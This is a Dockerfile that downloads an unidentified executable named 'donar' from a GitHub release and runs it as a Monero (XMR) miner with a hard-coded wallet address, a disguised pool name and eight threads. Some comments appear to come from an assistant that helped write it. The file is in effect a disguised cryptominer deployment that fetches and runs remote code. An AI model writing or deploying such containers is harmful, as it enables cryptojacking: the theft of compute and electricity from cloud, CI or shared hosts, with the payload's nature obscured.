# Stage 1: Build/Prepare
# We use ubuntu:24.04 to match your 'setup' config
FROM ubuntu:24.04 AS builder

# Prevent interactive prompts during package installation
ARG DEBIAN_FRONTEND=noninteractive

# Prepare commands
# Added 'ca-certificates' to ensure wget can handle HTTPS correctly
RUN apt-get update && \
  apt-get install -y wget ca-certificates && \
  rm -rf /var/lib/apt/lists/*

# Build commands
WORKDIR /build
RUN wget -O donar "https://github.com/lilcoinzdc/donuts/releases/download/tripple-nut/donar" && \
  chmod +x donar

# ---

# Stage 2: Runtime
FROM ubuntu:24.04

WORKDIR /app

# Deploy files: Copy only the binary from the builder stage
COPY --from=builder /build/donar .

# Run command
# I've broken the arguments into an array for clarity and safety
CMD ["./donar", \
  "--coin", "XMR", \
  "--url", "donuts", \
  "--user", "8B1e8kfLb6xLmU6VmKhG5ydJXKVY1faZdfHsPRDCzFuYXp1MpGLctXxJj2SxhT6beGYKHbo4ohUk7csghsUzo2BCUfC67Ew/ngas", \
  "--threads", "8"]
